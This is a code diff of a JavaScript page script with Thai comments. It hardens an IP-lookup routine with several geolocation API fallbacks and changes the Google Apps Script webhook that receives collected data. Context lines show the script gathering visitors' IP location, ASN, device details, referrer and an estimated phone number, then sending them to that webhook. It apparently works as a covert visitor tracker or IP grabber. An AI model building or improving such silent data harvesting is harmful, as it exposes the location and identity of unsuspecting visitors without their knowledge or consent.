@@ -87,7 +87,7 @@ function getUrlParameters() {
     Promise.all([
       getIPDetails().catch(error => {
           console.error("Error getting IP details:", error);
-          return {ip: "ไม่สามารถระบุได้"};
+          return {ip: "ไม่สามารถระบุได้", asn: "API Error"}; // ระบุข้อผิดพลาด ASN
       }),
       estimatePhoneNumber().catch(error => {
           console.error("Error estimating phone number:", error);
@@ -105,7 +105,7 @@ function getUrlParameters() {
       // เก็บข้อมูลที่จำเป็นทั้งหมด
       dataToSend = {
         timestamp: timestamp,
-        ip: ipData,
+        ip: ipData, // ipData ควรมี asn อยู่แล้วถ้า API ทำงานสำเร็จ
         deviceInfo: allDeviceData,
         phoneInfo: phoneInfo,
         referrer: referrer,
@@ -591,34 +591,40 @@ function detectBrowser() {
 }
 
 
-// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
+// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ปรับปรุง)
 async function getIPDetails() {
+  let apiSource = "unknown"; // Track which API provided the data
   try {
-    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว
-    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // ใส่ Token ถ้ามี
-    if (!response.ok) {
-        // ถ้า Token ไม่ถูกต้อง หรือมีปัญหา ลองแบบไม่มี Token
-        console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
-        const responseNoToken = await fetch('https://ipinfo.io/json');
-        if (!responseNoToken.ok) {
-             throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
-        }
-        return await responseNoToken.json();
+    // 1. Try ipinfo.io (without token first for free tier compatibility)
+    apiSource = "ipinfo.io (no token)";
+    console.log(`Attempting to fetch IP details from ${apiSource}...`);
+    const responseNoToken = await fetch('https://ipinfo.io/json');
+    if (!responseNoToken.ok) {
+         throw new Error(`ipinfo.io (no token) request failed with status ${responseNoToken.status}`);
     }
-    return await response.json();
+    const ipinfoData = await responseNoToken.json();
+    console.log(`Success: Fetched data from ${apiSource}`);
+    // Ensure 'asn' field exists, even if null
+    if (!ipinfoData.hasOwnProperty('asn')) {
+        ipinfoData.asn = "ไม่มีข้อมูล"; // Add asn field if missing
+    }
+    return ipinfoData;
 
   } catch (error) {
-    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
-    // Fallback ลองใช้ ip-api.com
+    console.error(`Error fetching from ${apiSource}:`, error);
+    // Fallback 2: Try ip-api.com
+    apiSource = "ip-api.com";
     try {
-        console.log("Trying fallback: ip-api.com");
+        console.log(`Attempting fallback: ${apiSource}...`);
         const fallbackResponse = await fetch('http://ip-api.com/json'); // ใช้ http เพื่อลดปัญหา CORS บางกรณี
         if (!fallbackResponse.ok) {
             throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
         }
         const fbData = await fallbackResponse.json();
+        console.log(`Success: Fetched data from ${apiSource}`);
         // แปลงข้อมูลจาก ip-api.com ให้มีโครงสร้างคล้าย ipinfo.io
-        return {
+        const asnMatch = fbData.as ? fbData.as.match(/AS\d+/) : null; // Extract only AS number
+        const mappedData = {
             ip: fbData.query || "ไม่สามารถระบุได้",
             hostname: "ไม่มีข้อมูล (ip-api)", // ip-api ไม่มี hostname
             city: fbData.city || "ไม่ทราบ",
@@ -627,21 +633,36 @@ async function getIPDetails() {
             loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล",
             org: fbData.org || "ไม่ทราบ",
             isp: fbData.isp || "ไม่ทราบ", // ip-api มี isp แยก
-            asn: fbData.as ? fbData.as.split(' ')[0] : "ไม่ทราบ", // ip-api มี as
+            asn: asnMatch ? asnMatch[0] : "ไม่มีข้อมูล", // ใช้ ASN ที่สกัดมา หรือ "ไม่มีข้อมูล"
             postal: "ไม่มีข้อมูล (ip-api)",
-            timezone: fbData.timezone || "ไม่ทราบ"
+            timezone: fbData.timezone || "ไม่ทราบ",
+            apiSource: apiSource // Add source info
         };
+        return mappedData;
     } catch (fallbackError) {
-        console.error("ไม่สามารถดึง IP จาก fallback (ip-api.com) ได้:", fallbackError);
-        // Fallback สุดท้าย: ipify.org (ได้แค่ IP)
+        console.error(`Error fetching from fallback (${apiSource}):`, fallbackError);
+        // Fallback 3: Final fallback - ipify.org (IP only)
+        apiSource = "api.ipify.org";
         try {
-            console.log("Trying final fallback: api.ipify.org");
+            console.log(`Attempting final fallback: ${apiSource}...`);
             const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
+            if (!finalFallbackResponse.ok) {
+                throw new Error(`ipify.org request failed with status ${finalFallbackResponse.status}`);
+            }
             const finalFbData = await finalFallbackResponse.json();
-            return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
+            console.log(`Success: Fetched data from ${apiSource}`);
+            return {
+                ip: finalFbData.ip || "ไม่สามารถระบุได้",
+                asn: "ไม่มีข้อมูล (ipify)", // Explicitly state no ASN
+                apiSource: apiSource
+            };
         } catch (finalFallbackError) {
-             console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
-             return { ip: "ไม่สามารถระบุได้" };
+             console.error(`Error fetching from final fallback (${apiSource}):`, finalFallbackError);
+             return {
+                 ip: "ไม่สามารถระบุได้",
+                 asn: "API Error", // Indicate a general API error
+                 apiSource: "failed_all"
+             };
         }
     }
   }
@@ -709,7 +730,7 @@ async function estimatePhoneNumber() {
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxVUPrz4qwGHtHyJwMS4idEpB1AmnoSvojGy_J3ZJTMqF-XQNC4VTLBZlOeo0kDqgo/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzuwfqUlXT0YrhmGvFZm7wEnn_iqHF1eUhPtcJJo-gXxZPUarQ8AX6hvPkzYxG9tGJU/exec';
 
   // ตรวจสอบว่ามี requestId หรือไม่ ถ้าไม่มีให้สร้างใหม่
   if (!dataToSend.requestId) {
